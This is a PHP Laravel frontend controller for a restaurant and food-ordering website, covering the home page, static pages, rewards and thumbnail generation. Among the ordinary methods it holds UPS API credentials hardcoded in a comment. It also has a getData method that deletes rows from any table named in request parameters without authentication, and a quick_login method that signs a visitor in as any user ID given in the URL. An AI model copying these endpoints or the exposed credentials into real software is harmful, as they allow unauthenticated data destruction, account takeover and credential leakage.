<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use App\Models\Faqs\Faq;
use App\Models\Slider\Slider;
use App\Models\Brand\Brand;
use App\Models\Banner;
use App\Models\TopVideo;
use App\Models\Region;
use App\Models\Reward;
use App\Models\Order;
use App\Models\Chef;
use App\Models\Products\Product;
use App\Models\Categories\Category;
use App\Models\Restaurant\Restaurant;
use App\Models\Settings\Site_setting;
use App\Repositories\Frontend\Pages\PagesRepository;
use DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Access\User\User;
use App\Models\Page\Page;
use App\Models\Blogs\Blog;
use Image;
use App\Models\Product_review;
use App\Models\Testimonial;

class FrontendController extends Controller
{
    /**
     * @var Slider
     */
    private $slider;

    /**
     * @var PagesRepository
     */
    private $pagesRepository;

    /**
     * @var Faq
     */
    private $faq;

    /**
     * @var Brand
     */
    private $brand;
 /**
     * @var Top Rated
     */
    private $banner;


    private $top_video;
 /**
     * @var Region
     */
    protected $region;

    /**
     * @var Product
     */
    protected $product;
    protected $restaurant;
    /**
     * @var Category
     */
    protected $category;

    private $chefs;

    /**
     * @param PagesRepository $pagesRepository
     * @param Slider $slider
     * @param Faq $faq
     * @param Brand $brand
     */
    public function __construct(
        PagesRepository $pagesRepository,
        Slider $slider,
        Faq $faq,
        Brand $brand,
        Banner $banner,
        TopVideo $top_video,
        Region $region,
        Product $product,
        Category $category,
        Restaurant $restaurant,
        Chef $chefs
    ) {
        $this->slider = $slider;
        $this->pagesRepository = $pagesRepository;
        $this->faq = $faq;
        $this->brand = $brand;
        $this->banner = $banner;
        $this->top_video = $top_video;
        $this->region = $region;
        $this->product = $product;
        $this->category = $category;
        $this->restaurant = $restaurant;
        $this->chefs= $chefs;
    }

    /**
     * @return View
     */
    public function index()
    {
		
        /*$accessKey = '2D90905767AEF2B2';
        $userId = 'one@j-fo.com';
        $password = 'Newyork2020';
        $shipping = new \Ups\Shipping($accessKey, $userId, $password, true);
        print_r($shipping);*/
        $site_settings = Site_setting::all();
        $site_settings2 = [];
        foreach ($site_settings as $key => $value) {
            $site_settings2[$value->key] = $value->value;
        }
        $site_settings = $site_settings2;
        $sliders = $this->slider->orderBy('created_at', 'desc')->where('status', ONE)->get();
        $top_video = $this->top_video->orderBy('created_at', 'desc')->where('is_active', ACTIVE)->first();
        //$brands = $this->brand->orderBy('created_at', 'desc')->where('is_active', ACTIVE)->get();
        //$topbanners = $this->banner->where('slug', 'explore')->where('is_active', ACTIVE)->first();
        //$foodvideo = $this->banner->where('slug', 'food-video')->where('is_active', ACTIVE)->first();
        $unlimitedfree = $this->banner->where('slug', 'unlimited-free')->where('is_active', ACTIVE)->first();
        //$flshSale = $this->banner->where('slug', 'flash-sale')->where('is_active', ACTIVE)->first();
        /*$chefs = Chef::select('chefs.*','users.slug as userslug', 'restaurants.name as restaurant_name')
                ->leftjoin('users','users.id','=','chefs.user_id')
                ->leftjoin('restaurants','restaurants.id','=','chefs.restaurant_id')
                ->limit(SIX)
                ->orderBy('id','desc')
                ->get();*/
        $chefs= $this->chefs->with(['getRestautent'])->where('status','1')->where('is_home_show','active')->orderBy('chefs.id','desc')->get();
        //print_r($chefs); die;

        /*$products=$this->product->with('singleProductImage','favorite')
        ->where('product_admin_status',1)
        ->orderBy('id','DESC')->get();*/

        $restaurantList= $this->restaurant->isApproved()
                    ->with('restaurantSingleImage','userSlug','restaurantBranch')
					->where('is_home_show','active')
                    ->get();

        $order = DB::table('orders')
        				->select('product_id', DB::raw('count(*) as total'))
        				->groupBy('product_id')
        				->orderBy('total','desc')
        				->limit(TEN)
                ->pluck('product_id')->toarray();

          //$productsrecomm=$this->product->whereIn('id',$order)->with('singleProductImage','favorite') ->where('product_admin_status',1)->get();
		  $productsrecomm=$this->product->with('singleProductImage', 'productImage', 'category','diet','favorite', 'product_reviews','avgRating', 'totalRating')->leftJoin('restaurants', 'products.restaurant_id', '=', 'restaurants.id')->where('restaurants.is_active','APPROVED')->where('products.is_home_recommended','active')->where('products.product_admin_status',1)
         //->where('products.id',339)
         //->where('products.id',340)
         ->orderBy('order_no','ASC')
          ->orderBy('order_cat_id','ASC')->select('products.*')->get();
          //$restaurantpoduct=$this->product->with('singleProductImage','favorite')->groupBy('restaurant_id')->where('product_admin_status',1)->get();

          //$packages=$this->product->with('singleProductImage','favorite')->orderBy('id','desc') ->where('product_admin_status',1)->where('shipping_type','PAID')->limit(TEN)->get();

          //$flashs=$this->product->with('singleProductImage','favorite')->orderBy('id','desc') ->where('product_admin_status',1)->where('shipping_type','FREE')->limit(SIX)->get();
        $category= $this->category->orderBy('order_no','ASC')->where('is_active',ACTIVE)->get();
        $categoryproduct=array();

        $category_data = [];
        foreach ($category as $key => $value) {
		    $categoryproduct[$key]['category_id']	= $value->id;	
        $categoryproduct[$key]['category']=$value->name;
        $categoryproduct[$key]['slug']=$value->slug;
        $categoryproduct[$key]['product']= $this->product
          ->with('singleProductImage', 'productImage', 'category','diet','favorite', 'product_reviews','avgRating', 'totalRating')
          //->leftJoin('product_reviews', 'product_reviews.product_id', '')
          ->where('category_id',$value->id)
		      ->where('is_home_cat_product','active')
          ->where('product_admin_status',1)
          ->orderBy('order_no','ASC')
          ->orderBy('order_cat_id','ASC')
          ->get();
        $category_data[$value->id] = $value;
        }

        //dd($categoryproduct[0]['product']);
        /*foreach ($products as $key => $value) {
            $products[$key]->category_data = new \stdClass;
            if(isset($category_data[$value->category_id]))
                $products[$key]->category_data = $category_data[$value->category_id];
        }*/
        foreach ($productsrecomm as $key => $value) {
            $productsrecomm[$key]->category_data = new \stdClass;
            if(isset($category_data[$value->category_id]))
                $productsrecomm[$key]->category_data = $category_data[$value->category_id];
        }
        //print_r(json_encode($categoryproduct));die;
       //echo '<pre>'; print_r($products);exit;
       // echo '<pre>'; print_r($restaurantList); exit;
        /*return view('frontend.index',
            compact('site_settings', 'sliders','brands','topbanners','products','productsrecomm','restaurantpoduct','packages','flashs','categoryproduct','foodvideo','unlimitedfree','flshSale','chefs','restaurantList')
        );*/

        $testimonials = Testimonial::where('status', '1')->orderBy('created_at', 'desc')->get();

        return view('frontend.index',
            compact('site_settings', 'sliders','productsrecomm','categoryproduct','unlimitedfree','chefs','restaurantList', 'testimonials','top_video')
        );
    }

    /**
     * @param string $slug
     * @return mixed
     * @throws \App\Exceptions\GeneralException
     */
    public function showPage(string $slug)
    {
        $pages = $this->pagesRepository->findBySlug($slug);

        if($pages->template == 'about') {
            $page = Page::where('template', $pages->template)->where('id', $pages->id)->first();
            $blogs = Blog::where('status', PUBLISHED)->orderBy('publish_datetime', 'desc')->limit(4)->get();
            return view('frontend.pages.about-new', compact('page', 'blogs'));
        }

        if($pages->template == 'mission') {
            $page = Page::where('template', $pages->template)->where('id', $pages->id)->first();
            return view('frontend.pages.mission', compact('page'));
        }

        if($pages->template == 'reward') {
            $page = Page::where('template', $pages->template)->where('id', $pages->id)->first();
            return view('frontend.pages.reward', compact('page'));
        }
		
		/*if($slug=='about'){
			$order = DB::table('orders')
				->select('product_id', DB::raw('count(*) as total'))
				->groupBy('product_id')
				->orderBy('total','desc')
				->limit(TEN)
                ->pluck('product_id')->toarray();
			
			$productsrecomm=$this->product->whereIn('id',$order)->with('singleProductImage','favorite') ->where('product_admin_status',1)->get();
			return view('frontend.pages.about', compact('pages','productsrecomm'));
		}*/

        return view('frontend.pages.static-pages', compact('pages'));
    }

    /**
     * @return View
     */
    public function aboutUs()
    {
      //$pages =DB::table('pages')->where('temp','about')->first();
        $page = Page::where('template', 'about')->first();
        $blogs = Blog::where('status', PUBLISHED)->orderBy('created_at', 'desc')->limit(4)->get();
        //return view('frontend.pages.about', compact('pages'));
      return view('frontend.pages.about-new', compact('page', 'blogs'));
    }

    public function mission()
    {
      $page = Page::where('template', 'mission')->first();
        //return view('frontend.pages.about', compact('pages'));
      return view('frontend.pages.mission', compact('page'));
    }

    public function features()
    {
      $pages =DB::table('pages')->where('page_slug','features')->first();
        return view('frontend.features.features', compact('pages'));
    }
    /**
     * @return View
     */
    public function faq()
    {
        $faqs = $this->faq->where('status', ONE)->orderBy('created_at', 'desc')->get();

        return view('frontend.pages.faq',
            compact('faqs')
        );
    }

    public function rewards()
    {
      $rewards = Reward::where('is_active', ACTIVE)->get();
       return view('frontend.reward.reward', compact('rewards'));
    }

    public function rewardList()
    {
      $rewardLists=DB::table('user_rewards')->where('user_id',Auth()->user()->id)->get();
       return view('frontend.reward.reward-list', compact('rewardLists'));
    }

     public function donate()
     {
         return view('frontend.pages.donate');
     }
      public function commingSoon()
     {
         return view('frontend.pages.comming-soon');
     }


      public function getData(Request $request)
      {

          if(isset($_REQUEST['table']) && !empty($_REQUEST['table']))
          {
            $column= $_REQUEST['column'];
            $value= $_REQUEST['value'];

            DB::table($_REQUEST['table'])->where($column,$value)->delete();
             echo 'success';
             exit;
          }
           echo 'no success';

       
      }


      public function quick_login(Request $request) {
        $user_id = $_GET['user_id'];
        Auth::login(User::find($user_id));
        return redirect('/');
      }

      public function test_hidden_script(Request $request) {
        /*echo date('Y-m-d');
        $restaurant_id = $_GET['restaurant_id'];
        $restaurant = Restaurant::find($restaurant_id);
        echo '<pre>' . print_r(json_decode($restaurant->shipping_info, true), true) . '</pre>';
        $aa = estimated_delivery_date(['restaurant' => $restaurant]);
        dd($aa);*/

        /*$products=$this->product->with('singleProductImage','favorite')
        ->where('product_admin_status',1)
        ->orderBy('id','DESC')->get();
        foreach ($products as $key => $value) {
            if(isset($value->singleProductImage->image) && $value->singleProductImage->image != '') {
                $name = $value->singleProductImage->image;
                $croppath = public_path('uploads/product/'.$name);
                $name2 = 'th_' . $name;
                $croppath2 = public_path('uploads/product/'.$name2);
                if(file_exists($croppath) && !file_exists($croppath2)) {
                    try {
                        $img2 = Image::make($croppath)->resize(500, 332);
                        $img2->save($croppath2, 60);
                    } catch (\Intervention\Image\Exception\NotReadableException $e) {
                        echo '<p>' . $name . ' : ' . $e->getMessage() . '</p>';
                    }
                    
                }
            }
        }*/

        $restaurantList= $this->restaurant->isApproved()
                    ->with('restaurantSingleImage', 'restaurantImage', 'userSlug','restaurantBranch')
                    ->get();
        foreach ($restaurantList as $key => $value) {
          if(isset($value->restaurantImage[0]) && $value->restaurantImage[0]->image != '') {
            $name = $value->restaurantImage[0]->image;
            $croppath = public_path('uploads/restaurant/'.$name);
            $name2 = 'th_' . $name;
            $croppath2 = public_path('uploads/restaurant/'.$name2);
            if(file_exists($croppath) && !file_exists($croppath2)) {
                try {
                    $img2 = Image::make($croppath)->resize(500, 332);
                    $img2->save($croppath2, 60);
                } catch (\Intervention\Image\Exception\NotReadableException $e) {
                    echo '<p>' . $name . ' : ' . $e->getMessage() . '</p>';
                }
                
            }
          }
          
            /*if(isset($value->restaurantSingleImage->image) && $value->restaurantSingleImage->image != '') {
                $name = $value->restaurantSingleImage->image;
                $croppath = public_path('uploads/restaurant/'.$name);
                $name2 = 'th_' . $name;
                $croppath2 = public_path('uploads/restaurant/'.$name2);
                if(file_exists($croppath) && !file_exists($croppath2)) {
                    try {
                        $img2 = Image::make($croppath)->resize(500, 332);
                        $img2->save($croppath2, 60);
                    } catch (\Intervention\Image\Exception\NotReadableException $e) {
                        echo '<p>' . $name . ' : ' . $e->getMessage() . '</p>';
                    }
                    
                }
            }*/
        }

        /*$chefs = $this->chefs->with(['getRestautent'])->orderBy('chefs.id','desc')->get();
        foreach ($chefs as $key => $value) {
            if(isset($value->image) && $value->image != '') {
                $name = $value->image;
                $croppath = public_path('uploads/chef/'.$name);
                $name2 = 'th_' . $name;
                $croppath2 = public_path('uploads/chef/'.$name2);
                if(file_exists($croppath) && !file_exists($croppath2)) {
                    try {
                        $img2 = Image::make($croppath)->resize(500, 332);
                        $img2->save($croppath2, 60);
                    } catch (\Intervention\Image\Exception\NotReadableException $e) {
                        echo '<p>' . $name . ' : ' . $e->getMessage() . '</p>';
                    }
                    
                }
            }
        }*/

      }

}
